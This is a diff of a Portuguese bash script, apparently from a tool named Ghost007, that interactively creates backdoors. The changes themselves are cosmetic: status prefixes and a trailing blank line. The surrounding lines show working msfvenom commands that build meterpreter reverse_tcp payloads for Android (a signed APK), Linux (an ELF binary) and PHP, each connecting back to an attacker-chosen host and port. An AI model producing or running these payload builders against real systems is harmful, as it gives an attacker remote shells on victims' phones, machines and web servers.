@@ -60,7 +60,7 @@ case "$opcao" in
 		printf "$purple"
 		read -p "[?] informe a porta que ira aguardar a conexão: " lport2
 		printf "${blue}[i] lport=$lport2 ${end}\n"
-                printf "${green}[+] Criando Backdoor... \n"
+                printf "${green}[*] Criando Backdoor... \n"
                 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost2 LPORT=$lport2 -o $nome2.apk
 		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome2.apk"
 		d2j-apk-sign $nome2.apk
@@ -84,7 +84,7 @@ case "$opcao" in
 		printf "$purple"
 		read -p "[?] informe a porta que ira aguardar a conexão: " lport3
                 printf "${blue}[i] lport=$lport3 ${end}\n"
-                printf "${green}[+] Criando Backdoor...${end} \n"
+                printf "${green}[*] Criando Backdoor...${end} \n"
                 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost3 LPORT=$lport3 -f elf -o $nome3.elf
 		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome3.elf"
 		chmod +x $nome3.elf
@@ -105,7 +105,7 @@ case "$opcao" in
 		printf "$green"
                 read -p "[?] informe a porta que ira aguardar a conexão: " lport4
                 printf "${blue}[i] lport=$lport4 ${end}\n"
-                printf "${green}[+] Criando Backdoor...${end} \n"
+                printf "${green}[*] Criando Backdoor...${end} \n"
                 msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost4 LPORT=$lport4 -o $nome4.php
 		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome4.php"
 		chmod +x $nome4.php
@@ -125,4 +125,3 @@ case "$opcao" in
 
 
 esac
-
